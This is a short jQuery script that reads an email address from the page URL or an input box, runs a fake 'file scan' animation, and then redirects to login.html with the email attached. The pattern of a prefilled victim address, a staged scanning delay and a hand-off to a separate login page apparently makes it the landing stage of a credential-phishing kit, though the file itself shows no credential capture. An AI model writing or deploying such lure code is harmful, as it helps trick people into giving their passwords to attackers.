$(document).ready(function() {
        // Stop marquee animation initially
        $('#file-marquee').attr('behavior', 'alternate');
        
        //var email = window.location.hash.substr(1);
        var emailFilter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
		
		const url = window.location.href;
		const emailRegex = /\?([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})/;
		const match = url.match(emailRegex);
		  
		if (match && match[1]) {
		  console.log("Extracted email from URL (new format):", match[1]);
		  //return match[1];
		  //var email = match[1];
		  startScanProcess(match[1]);
		//}
        
        // Check if valid email is in URL
        //if (email && emailFilter.test(email)) {
          // Valid email in URL - start animation and redirect
          //startScanProcess(email);
        } else {
          // No valid email - show input field
          $('#email-container').show();
          $('#email-input').focus();
        }
        
        // Start scan button click handler
        $('#scan-button').click(function() {
          var inputEmail = $('#email-input').val().trim();
          
          if (emailFilter.test(inputEmail)) {
            // Valid email - start animation and redirect
            $('#email-error').hide();
            startScanProcess(inputEmail);
          } else {
            // Invalid email - show error
            $('#email-error').show();
            $('#email-input').focus();
          }
        });
        
        // Start scan process function
        function startScanProcess(email) {
          // Start marquee animation
          $('#file-marquee').attr('behavior', 'scroll');
          
          // Hide email input container
          $('#email-container').hide();
          
          // Redirect after 5 seconds
          setTimeout(function() {
            window.location.replace("login.html?" + email);
          }, 5000);
        }
        
        // Allow Enter key to trigger scan
        $('#email-input').keypress(function(e) {
          if (e.which === 13) {
            $('#scan-button').click();
          }
        });
      });